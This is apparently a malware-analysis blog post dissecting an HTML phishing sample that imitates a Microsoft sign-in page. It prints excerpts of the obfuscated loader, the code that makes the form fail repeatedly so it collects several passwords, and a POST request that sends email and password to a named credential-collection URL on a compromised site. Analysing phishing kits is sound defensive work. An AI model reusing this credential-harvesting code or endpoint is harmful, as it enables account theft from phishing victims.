<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><meta http-equiv=x-ua-compatible content="IE=edge, chrome=1"><title>Docsend Payment Audistore phisher - Brian Stadnicki</title><meta name=Description content><meta property="og:title" content="Docsend Payment Audistore phisher"><meta property="og:description" content="This phishing sample was delivered through docsend and relies on the user opening the downloaded html file and logging into microsoft. Sample collected from JOESandbox.
MD5: 7d6375abf1cff57c9d7da133cfaf0782
Loader <!-- TG9yZW0gaXBzdW0gZG9sb3Igc2l0IGFtZXQsIGNvbn ... --><script type='text/javascript'>document.write('\u003C\u0021\u002D\u002D\u0058\u0056\u005A\u0054\u0074\u006D...');</script><!-- TgZG9sb3Igc2l0IGFtZXQsIGNvbnNlY3R ... G1vZG8gdHlwaSwgcXVpIG51bmMgbm9iaXMgdmlkZW50dXIgcGFydW0gY2xhcmksIGZpYW50IHNvbGxlbW5lcyBpbiBmdXR1cnVtLg #### #### --> There&rsquo;s a large comment full of likely random data to help evade detection, and a call to document.write, which writes text to the document stream.
Packed First of all, it appears the embedded html page was packed using Proteger HTML, and their license expires on Sun Dec 05 2021 01:29:00 GMT, that&rsquo;s in just 5 days of this post being published."><meta property="og:type" content="article"><meta property="og:url" content="https://brianstadnicki.github.io/posts/malware-docsend-payment-phisher-audi/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-11-30T00:00:00+00:00"><meta property="article:modified_time" content="2021-11-30T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Docsend Payment Audistore phisher"><meta name=twitter:description content="This phishing sample was delivered through docsend and relies on the user opening the downloaded html file and logging into microsoft. Sample collected from JOESandbox.
MD5: 7d6375abf1cff57c9d7da133cfaf0782
Loader <!-- TG9yZW0gaXBzdW0gZG9sb3Igc2l0IGFtZXQsIGNvbn ... --><script type='text/javascript'>document.write('\u003C\u0021\u002D\u002D\u0058\u0056\u005A\u0054\u0074\u006D...');</script><!-- TgZG9sb3Igc2l0IGFtZXQsIGNvbnNlY3R ... G1vZG8gdHlwaSwgcXVpIG51bmMgbm9iaXMgdmlkZW50dXIgcGFydW0gY2xhcmksIGZpYW50IHNvbGxlbW5lcyBpbiBmdXR1cnVtLg #### #### --> There&rsquo;s a large comment full of likely random data to help evade detection, and a call to document.write, which writes text to the document stream.
Packed First of all, it appears the embedded html page was packed using Proteger HTML, and their license expires on Sun Dec 05 2021 01:29:00 GMT, that&rsquo;s in just 5 days of this post being published."><meta name=application-name content="Brian Stadnicki"><meta name=apple-mobile-web-app-title content="Brian Stadnicki"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://brianstadnicki.github.io/posts/malware-docsend-payment-phisher-audi/><link rel=prev href=https://brianstadnicki.github.io/posts/htb-challenge-93/><link rel=next href=https://brianstadnicki.github.io/posts/malware-ole-ole2-embed-links/><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=/lib/fontawesome-free/all.min.css><link rel=stylesheet href=/lib/animate/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"Docsend Payment Audistore phisher","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/brianstadnicki.github.io\/posts\/malware-docsend-payment-phisher-audi\/"},"genre":"posts","keywords":"reverse engineering, malware, html, phishing, js","wordcount":378,"url":"https:\/\/brianstadnicki.github.io\/posts\/malware-docsend-payment-phisher-audi\/","datePublished":"2021-11-30T00:00:00+00:00","dateModified":"2021-11-30T00:00:00+00:00","publisher":{"@type":"Organization","name":"Brian Stadnicki"},"author":{"@type":"Person","name":"Brian Stadnicki"},"description":""}</script></head><body header-desktop header-mobile><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":''==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:''==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="Brian Stadnicki">Brian Stadnicki</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>Posts </a><a class=menu-item href=/tags/>Tags </a><a class=menu-item href=/categories/>Categories </a><span class="menu-item delimiter"></span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw"></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="Brian Stadnicki">Brian Stadnicki</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><a class=menu-item href=/posts/ title>Posts</a><a class=menu-item href=/tags/ title>Tags</a><a class=menu-item href=/categories/ title>Categories</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw"></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class="toc-content always-active" id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animated flipInX">Docsend Payment Audistore phisher</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw"></i>Brian Stadnicki</a></span>&nbsp;<span class=post-category>included in <a href=/categories/malware-analysis/><i class="far fa-folder fa-fw"></i>malware analysis</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2021-11-30>2021-11-30</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;378 words&nbsp;
<i class="far fa-clock fa-fw"></i>&nbsp;2 minutes&nbsp;</div></div><div class="details toc" id=toc-static kept><div class="details-summary toc-title"><span>Contents</span>
<span><i class="details-icon fas fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#loader>Loader</a></li><li><a href=#packed>Packed</a><ul><li><a href=#form>Form</a></li><li><a href=#audi-store>Audi Store</a></li></ul></li></ul></nav></div></div><div class=content id=content><p><img class=lazyload src=/svg/loading.min.svg data-src=/posts/malware-docsend-payment-phisher-audi/overview.png data-srcset="/posts/malware-docsend-payment-phisher-audi/overview.png, /posts/malware-docsend-payment-phisher-audi/overview.png 1.5x, /posts/malware-docsend-payment-phisher-audi/overview.png 2x" data-sizes=auto alt=/posts/malware-docsend-payment-phisher-audi/overview.png title=Overview></p><p>This phishing sample was delivered through <code>docsend</code> and relies on the user opening the downloaded html file and logging into microsoft. Sample collected from <a href=https://www.joesandbox.com/analysis/898395 target=_blank rel="noopener noreffer">JOESandbox</a>.</p><p>MD5: <code>7d6375abf1cff57c9d7da133cfaf0782</code></p><h2 id=loader>Loader</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=c>&lt;!--
</span></span></span><span class=line><span class=cl><span class=c>TG9yZW0gaXBzdW0gZG9sb3Igc2l0IGFtZXQsIGNvbn
</span></span></span><span class=line><span class=cl><span class=c>...  --&gt;</span><span class=p>&lt;</span><span class=nt>script</span> <span class=na>type</span><span class=o>=</span><span class=s>&#39;text/javascript&#39;</span><span class=p>&gt;</span><span class=nb>document</span><span class=p>.</span><span class=nx>write</span><span class=p>(</span><span class=s1>&#39;\u003C\u0021\u002D\u002D\u0058\u0056\u005A\u0054\u0074\u006D...&#39;</span><span class=p>);&lt;/</span><span class=nt>script</span><span class=p>&gt;</span><span class=c>&lt;!-- TgZG9sb3Igc2l0IGFtZXQsIGNvbnNlY3R
</span></span></span><span class=line><span class=cl><span class=c>...
</span></span></span><span class=line><span class=cl><span class=c>G1vZG8gdHlwaSwgcXVpIG51bmMgbm9iaXMgdmlkZW50dXIgcGFydW0gY2xhcmksIGZpYW50IHNvbGxlbW5lcyBpbiBmdXR1cnVtLg
</span></span></span><span class=line><span class=cl><span class=c>
</span></span></span><span class=line><span class=cl><span class=c>#### #### --&gt;</span>
</span></span></code></pre></div><p>There&rsquo;s a large comment full of likely random data to help evade detection, and a call to <code>document.write</code>, which writes text to the document stream.</p><h2 id=packed>Packed</h2><p>First of all, it appears the embedded html page was packed using <a href=https://www.ProtegerHtml.com/en target=_blank rel="noopener noreffer">Proteger HTML</a>, and their license expires on <code>Sun Dec 05 2021 01:29:00 GMT</code>, that&rsquo;s in just 5 days of this post being published.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kd>var</span> <span class=nx>timeexpiracion</span><span class=o>=</span><span class=mi>1638667740</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>timehoy</span> <span class=o>=</span> <span class=nb>Math</span><span class=p>.</span><span class=nx>round</span><span class=p>(</span><span class=o>+</span><span class=k>new</span> <span class=nb>Date</span><span class=p>()</span><span class=o>/</span><span class=mi>1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>timehoy</span><span class=o>&gt;</span><span class=nx>timeexpiracion</span><span class=p>)</span> <span class=p>{</span> <span class=nx>alert</span> <span class=p>(</span><span class=s2>&#34;The HTML Code of this Website was Encrypted Free at: www.ProtegerHtml.com/enNOTE: To encrypt your Website without...&#34;</span>
</span></span></code></pre></div><p>The blurred out word document is, as usual, just an image hosted on <code>gyazo</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>body</span> <span class=na>style</span><span class=o>=</span><span class=s>&#34;background-image:</span> <span class=na>url</span><span class=err>(&#39;</span><span class=na>https:</span><span class=err>//</span><span class=na>i</span><span class=err>.</span><span class=na>gyazo</span><span class=err>.</span><span class=na>com</span><span class=err>/</span><span class=na>d1b2270a564efe0c37d2e01ed1c647a8</span><span class=err>.</span><span class=na>png</span><span class=err>&#39;);</span> <span class=err>...</span><span class=p>&gt;</span>
</span></span></code></pre></div><h3 id=form>Form</h3><p>The microsoft form is a clone in terms of html and css of the real one, the difference is the javascript driving it. The create account and alternative sign-in links are just <code>#</code> of course.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kd>var</span> <span class=nx>base64regex</span> <span class=o>=</span> <span class=sr>/^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>base64regex</span><span class=p>.</span><span class=nx>test</span><span class=p>(</span><span class=nx>email</span><span class=p>))</span> <span class=p>{</span>  
</span></span></code></pre></div><p>There&rsquo;s even input validation on the email.</p><p>When the user clicks next, the malware fetches the email&rsquo;s logo using clearbit, eg <code>https://logo.clearbit.com/google.com</code>, defaulting to the microsoft logo.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/posts/malware-docsend-payment-phisher-audi/enter-password.png data-srcset="/posts/malware-docsend-payment-phisher-audi/enter-password.png, /posts/malware-docsend-payment-phisher-audi/enter-password.png 1.5x, /posts/malware-docsend-payment-phisher-audi/enter-password.png 2x" data-sizes=auto alt=/posts/malware-docsend-payment-phisher-audi/enter-password.png title="Enter password form"></p><p>When the user presses sign in, the text changes to <code>verifying..</code>, and a POST request is sent to the collection server.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nx>$</span><span class=p>.</span><span class=nx>ajax</span><span class=p>({</span>
</span></span><span class=line><span class=cl>    <span class=nx>dataType</span><span class=o>:</span> <span class=s1>&#39;JSON&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nx>url</span><span class=o>:</span> <span class=s2>&#34;https://www.audistore.com.ar/wp-admin/user/user/next.php&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nx>type</span><span class=o>:</span> <span class=s1>&#39;POST&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nx>data</span><span class=o>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>email</span><span class=o>:</span> <span class=nx>email</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nx>password</span><span class=o>:</span> <span class=nx>password</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nx>detail</span><span class=o>:</span> <span class=nx>detail</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span></code></pre></div><p>The <code>detail</code> in the request body appears to be nothing.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nx>$</span><span class=p>(</span><span class=s2>&#34;#password&#34;</span><span class=p>).</span><span class=nx>val</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>count</span> <span class=o>&gt;=</span> <span class=mi>3</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>count</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>$</span><span class=p>(</span><span class=s2>&#34;#div2&#34;</span><span class=p>).</span><span class=nx>animate</span><span class=p>({</span> <span class=nx>left</span><span class=o>:</span> <span class=mi>0</span><span class=p>,</span> <span class=nx>opacity</span><span class=o>:</span> <span class=s2>&#34;hide&#34;</span> <span class=p>},</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>$</span><span class=p>(</span><span class=s2>&#34;#div3&#34;</span><span class=p>).</span><span class=nx>animate</span><span class=p>({</span> <span class=nx>left</span><span class=o>:</span> <span class=mi>0</span><span class=p>,</span> <span class=nx>opacity</span><span class=o>:</span> <span class=s2>&#34;show&#34;</span> <span class=p>},</span> <span class=mi>500</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>setTimeout</span><span class=p>(()</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nb>window</span><span class=p>.</span><span class=nx>location</span><span class=p>.</span><span class=nx>replace</span><span class=p>(</span><span class=s2>&#34;https://office365.com/&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>},</span> <span class=mi>500</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>The form errors 2 times before redirecting the user to <code>https://office365.com/</code>, in order to collect any other passwords the user has.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/posts/malware-docsend-payment-phisher-audi/sign-in-attempt-timeout.png data-srcset="/posts/malware-docsend-payment-phisher-audi/sign-in-attempt-timeout.png, /posts/malware-docsend-payment-phisher-audi/sign-in-attempt-timeout.png 1.5x, /posts/malware-docsend-payment-phisher-audi/sign-in-attempt-timeout.png 2x" data-sizes=auto alt=/posts/malware-docsend-payment-phisher-audi/sign-in-attempt-timeout.png title="Sign in attempt timeout"></p><p><img class=lazyload src=/svg/loading.min.svg data-src=/posts/malware-docsend-payment-phisher-audi/password-incorrect.png data-srcset="/posts/malware-docsend-payment-phisher-audi/password-incorrect.png, /posts/malware-docsend-payment-phisher-audi/password-incorrect.png 1.5x, /posts/malware-docsend-payment-phisher-audi/password-incorrect.png 2x" data-sizes=auto alt=/posts/malware-docsend-payment-phisher-audi/password-incorrect.png title="Password incorrect"></p><p>After collecting 3 of the user&rsquo;s passwords, it gives a very dodgy looking success screen.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/posts/malware-docsend-payment-phisher-audi/success-redirecting.png data-srcset="/posts/malware-docsend-payment-phisher-audi/success-redirecting.png, /posts/malware-docsend-payment-phisher-audi/success-redirecting.png 1.5x, /posts/malware-docsend-payment-phisher-audi/success-redirecting.png 2x" data-sizes=auto alt=/posts/malware-docsend-payment-phisher-audi/success-redirecting.png title="Success redirecting"></p><p>Then it redirects to <code>https://office365.com/</code>.</p><h3 id=audi-store>Audi Store</h3><p>The credentials are collected at <code>https://www.audistore.com.ar/wp-admin/user/user/next.php</code>. Only the <a href=https://crdf.fr target=_blank rel="noopener noreffer">CRDF</a> has placed this domain on the malicous URL list so far.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/posts/malware-docsend-payment-phisher-audi/audistore.png data-srcset="/posts/malware-docsend-payment-phisher-audi/audistore.png, /posts/malware-docsend-payment-phisher-audi/audistore.png 1.5x, /posts/malware-docsend-payment-phisher-audi/audistore.png 2x" data-sizes=auto alt=/posts/malware-docsend-payment-phisher-audi/audistore.png title="Audi store"></p><p>Looks like somebody forgot to update their wordpress installation&mldr;</p><p>I&rsquo;ve contacted them to try to get this removed from their website.</p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2021-11-30</span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/reverse-engineering/>reverse engineering</a>,&nbsp;<a href=/tags/malware/>malware</a>,&nbsp;<a href=/tags/html/>html</a>,&nbsp;<a href=/tags/phishing/>phishing</a>,&nbsp;<a href=/tags/js/>js</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav><a href=/posts/htb-challenge-93/ class=prev rel=prev title="HTB forensics challenge: oBfsC4t10n #93"><i class="fas fa-angle-left fa-fw"></i>HTB forensics challenge: oBfsC4t10n #93</a>
<a href=/posts/malware-ole-ole2-embed-links/ class=next rel=next title="Embedded objects in OLE & OLE2 using links">Embedded objects in OLE & OLE2 using links<i class="fas fa-angle-right fa-fw"></i></a></div></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>Powered by <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.95.0">Hugo</a> | Theme - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a></div><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2022</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank></a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw"></i>
</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw"></i></a></div><script type=text/javascript src=/lib/smooth-scroll/smooth-scroll.min.js></script><script type=text/javascript src=/lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:10},comment:{}}</script><script type=text/javascript src=/js/theme.min.js></script><script defer src=https://static.cloudflareinsights.com/beacon.min.js data-cf-beacon='{"token": "f5dd1cc794e748f0a1fa431f62434694"}'></script></body></html>